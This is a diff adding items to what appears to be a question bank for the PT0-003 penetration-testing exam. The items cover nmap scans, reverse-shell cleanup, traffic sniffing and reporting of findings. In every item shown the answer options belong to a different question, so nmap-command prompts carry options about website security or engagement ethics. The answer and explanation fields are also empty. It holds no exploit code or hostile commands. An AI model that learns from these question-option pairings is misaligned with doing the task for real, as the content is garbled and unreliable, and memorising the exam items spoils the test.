+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are tasked with performing a vulnerability scan on a target network to identify the operating system running on a target host. The target host is known to be running a customized and secure version of a popular operating system. The target host is responding to ICMP echo requests. Type the nmap command to perform the scan.",
+      "options": [
+        "A. The website is not secure",
+        "B. The website uses client-side certificates",
+        "C. The website uses Perfect Forward Secrecy",
+        "D. The website uses SSL stripping"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_78",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are tasked with performing a vulnerability scan on a target network to identify the operating system running on a target host. The target host is known to be running a very old and insecure operating system that is no longer supported by the vendor. However, the target host is protected by a firewall that blocks all incoming ICMP packets. Type the command to perform the scan and complete the task.",
+      "options": [
+        "A. Share the data with the company's competitors to highlight their security flaws",
+        "B. Report the data to the media to expose the company's poor security practices",
+        "C. Inform the company of the data you discovered and provide recommendations on how to secure it",
+        "D. Ignore the data and continue with the penetration test"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_79",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are tasked with performing a vulnerability scan on a target network to identify the services running on a target host. The target host is behind a firewall that blocks incoming ping requests. Type the nmap command to ensure the scan would be successful.",
+      "options": [
+        "A. Use the tool since it is necessary to discover the vulnerability",
+        "B. Refrain from using the tool since it is outside the engagement scope",
+        "C. Ask for approval from the client to use the tool",
+        "D. Inform the client of the vulnerability without exploiting it"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_80",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are tasked with performing a vulnerability scan on a target network to identify the available services on a target host. The target host is running a popular web server on a standard port, and you want to ensure that the web server is included in the scan. Type the nmap command to perform the scan and complete the task.",
+      "options": [
+        "A. Report the CEO to the board of directors",
+        "B. Keep the information to yourself and complete the penetration testing",
+        "C. Use the information to blackmail the CEO for a higher fee",
+        "D. Report the CEO to the media for a reward"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_81",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are creating a script to automate a series of tasks on a Linux system. You want to check whether a file exists in a directory and take different actions depending on whether it does or doesn’t. Which of the following conditional statements would you use in your script?",
+      "options": [
+        "A. Skip the background check since the team members have already been vetted by the organization",
+        "B. Conduct a minimal background check since the financial institution has already vetted the organization",
+        "C. Conduct a thorough background check on all team members",
+        "D. Skip the background check since it's a waste of time"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_82",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a web application penetration test and wants to identify common vulnerabilities in the target web server. The tester needs a tool that can identify potential vulnerabilities such as misconfigurations, outdated software, and server-side scripting errors. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. The IP addresses that are allowed to access the cloud environment",
+        "B. The type of firewalls used to secure the cloud environment",
+        "C. The number of virtual machines hosted in the cloud environment",
+        "D. The cloud provider's service-level agreement"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_83",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "After conducting a penetration test on a client’s network, the tester set up a reverse shell to maintain access to the target system. Which of the following is a recommended post-engagement cleanup activity to remove the reverse shell?",
+      "options": [
+        "A. The number of endpoints the company has",
+        "B. The company's patch management process",
+        "C. The location of the cloud data center",
+        "D. The type of encryption used to secure the cloud environment"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_84",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration testing engagement, you have found a critical vulnerability that could result in a major data breach. Who should you communicate this finding to, and in what manner?",
+      "options": [
+        "A. Legal and financial penalties",
+        "B. Loss of data due to hardware failure",
+        "C. System downtime caused by a denial-of-service attack",
+        "D. Exposure of sensitive information due to a phishing attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_85",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is tasked with performing a network attack to intercept network traffic on a target system. The tester wants to be able to sniff the network traffic between the target system and the router, without being detected. Which attack should the tester perform in this scenario?",
+      "options": [
+        "A. The details of vulnerabilities identified during the test",
+        "B. The steps taken to exploit the vulnerabilities",
+        "C. The client's objectives for the test",
+        "D. The IP addresses of all the devices on the network"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_86",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration test, the tester successfully gains access to a domain controller through a privilege escalation attack. Which of the following post-exploitation techniques can be used to map out the network and discover high-value targets?",
+      "options": [
+        "A. Scope creep",
+        "B. Rules of engagement",
+        "C. System architecture",
+        "D. Network topology"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_87",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are tasked with performing a vulnerability scan on a target network that is behind the Cloudflare content delivery network (CDN). The target network is protected by a firewall that blocks incoming TCP packets but allows ICMP and UDP packets. The target host is known to be running a critical service that uses the User Datagram Protocol (UDP) on a non-standard port. Type the nmap command to perform the scan.",
+      "options": [
+        "A. CloudBrute",
+        "B. Nessus",
+        "C. Metasploit Framework",
+        "D. Nmap"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    }
+  ]
+}
